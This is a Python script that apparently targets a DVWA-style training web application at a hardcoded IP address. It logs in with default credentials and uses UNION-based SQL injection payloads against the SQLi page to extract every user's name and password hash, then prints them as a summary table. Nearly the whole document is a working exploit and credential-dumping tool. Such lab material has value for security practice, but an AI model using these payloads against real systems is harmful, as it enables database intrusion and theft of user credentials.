
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] EXTRACTING PASSWORD HASHES - CORRECT METHOD\n")
print("=" * 100)

# Extract using GROUP_CONCAT to see all at once
payload_str = "-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #"
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    print("All users in one query:")
    print(result_text)
    print()

print("=" * 100)
print("\n[*] Extracting individual user records:\n")

all_users = []

# Extract each user one by one
for user_id in range(1, 6):
    # Use the UNION SELECT with user and password columns
    payload_str = f"{user_id}' UNION SELECT user, password FROM users #"
    response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        
        # Parse the result
        id_match = re.search(r'ID: (\d+)' , result_text)
        fname_match = re.search(r'First name: ([^<\n]+)', result_text)
        sname_match = re.search(r'Surname: ([^<\n]+)', result_text)
        
        if id_match and fname_match and sname_match:
            user_id_val = id_match.group(1)
            username = fname_match.group(1).strip()
            password_hash = sname_match.group(1).strip()
            
            # Get first_name and last_name from regular query
            response_regular = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
            pre_match_regular = re.search(r'<pre>(.*?)</pre>', response_regular.text, re.DOTALL)
            if pre_match_regular:
                result_regular = pre_match_regular.group(1)
                fname_match_regular = re.search(r'First name: ([^<\n]+)', result_regular)
                sname_match_regular = re.search(r'Surname: ([^<\n]+)', result_regular)
                first_name = fname_match_regular.group(1).strip() if fname_match_regular else "N/A"
                last_name = sname_match_regular.group(1).strip() if sname_match_regular else "N/A"
            else:
                first_name = "N/A"
                last_name = "N/A"
            
            print(f"[+] User ID: {user_id_val}")
            print(f"    Username: {username}")
            print(f"    First Name: {first_name}")
            print(f"    Last Name: {last_name}")
            print(f"    Password Hash: {password_hash}")
            print()
            
            all_users.append({
                "id": user_id_val,
                "username": username,
                "first_name": first_name,
                "last_name": last_name,
                "password_hash": password_hash
            })

print("\n" + "=" * 100)
print(f"\n[+] FINAL SUMMARY - ALL {len(all_users)} USERS:\n")
print("-" * 100)
print(f"{'ID':<5} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash':<40}")
print("-" * 100)
for user in all_users:
    print(f"{user['id']:<5} {user['username']:<15} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<40}")
print("-" * 100)

